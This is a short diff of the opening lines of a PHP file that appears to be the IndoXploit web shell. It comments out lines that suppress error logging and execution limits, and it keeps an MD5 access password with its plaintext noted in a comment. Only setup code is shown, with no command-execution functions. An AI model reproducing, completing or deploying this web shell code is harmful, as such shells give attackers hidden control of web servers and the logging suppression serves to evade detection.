@@ -1,14 +1,14 @@
 <?php
 session_start();
 error_reporting(0);
-set_time_limit(0);
-@set_magic_quotes_runtime(0);
-@clearstatcache();
-@ini_set('error_log',NULL);
-@ini_set('log_errors',0);
-@ini_set('max_execution_time',0);
-@ini_set('output_buffering',0);
-@ini_set('display_errors', 0);
+//set_time_limit(0);
+//@set_magic_quotes_runtime(0);
+//@clearstatcache();
+//@ini_set('error_log',NULL);
+//@ini_set('log_errors',0);
+//@ini_set('max_execution_time',0);
+//@ini_set('output_buffering',0);
+//@ini_set('display_errors', 0);
 
 $password = "7b4939a8af28c814f0c757bb10f40d3d"; # md5: IndoXploit
 
